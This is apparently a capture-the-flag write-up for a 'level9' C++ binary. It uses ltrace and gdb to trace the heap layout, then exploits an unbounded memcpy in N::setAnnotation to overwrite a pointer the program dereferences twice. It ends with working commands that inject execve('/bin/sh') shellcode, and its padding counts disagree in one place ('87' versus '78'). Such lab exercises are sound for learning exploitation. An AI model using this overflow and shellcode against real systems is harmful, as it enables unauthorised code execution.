we run our program without any args, it exits without doing anything, we try running it with 1 or multiple arguments and program exits again without any output. we run it now with ltrace:
Without arguments, it calls exit(1) immediately.
With 1 or more args it, it calls _Znwj(), memcpy and _ZNSt8ios_base4InitD1Ev then the program exits.
(In ltrace and gdb we will see some functions names in gibberish and that's functions name mangling and that's encoding additional informations into functions done by compiler in modern programming languages to ensure that names are unique, we will use c++filt to demangle them).
In gdb, and after the prologue we see immediately a test (<+10>:   cmp   DWORD PTR [ebp+0x8],0x1), (ebp+0x8 here is argc) and if it's not greater than one, program will stop here.
In line <+35> we call new(0x6) and that returns the address 0x804a008.
In line <+53> we call N::N(5), we now know that we're dealing with a class and that's it's parametrized constructor, this line sets its int member to 5.
Lines <+69> and <+87> do the same but with another instance N::N(6) , now we have allocated 2 chunks of memory on the heap (from 0x804a008 to 0x804a074 and from 0x804a078 to 0x804a0e4) this is what the heap will look like:

0x804a008:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006  0x00020f21

In line <+131> the method N::setAnnotation(char*) that copies argv[1] into the first instance string using memcpy.
The next dereference the address 0x0804a078 2 times and then call it with (0x0804a078, 0x0804a008) as arguments.
We can exploit this, since memcpy here is unprotected and write strlen(argv[1]) into memory and that means we can write whatever we want into the address 0x0804a078 if our argv[1] has more than 108 characters (0x68).
since our argv[1] starts on memory 0x804a00c(0x804a008 + 0x4) we can write some shellcode on the beginning of our input then write more than 108 characters to point the address 0x0804a078 to our shellcode and execute it. we can do that using the following inline python :
cat | ./level9 $(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*87 + "\x0c\xa0\x04\x08"'), that's 108 (21bytes of shellcode + padding of 78 A) then we write 0x804a00c in 0x0804a078. This won't work as we said earlier that the address 0x0804a078 is dereferenced twice before executing it that's why we'll add (0x804a010) to the beginning of our argv[1] to redirect it once again to the next 4 bytes, let's not forget to subtract the 4 bytes that we added from padding):
cat | ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')
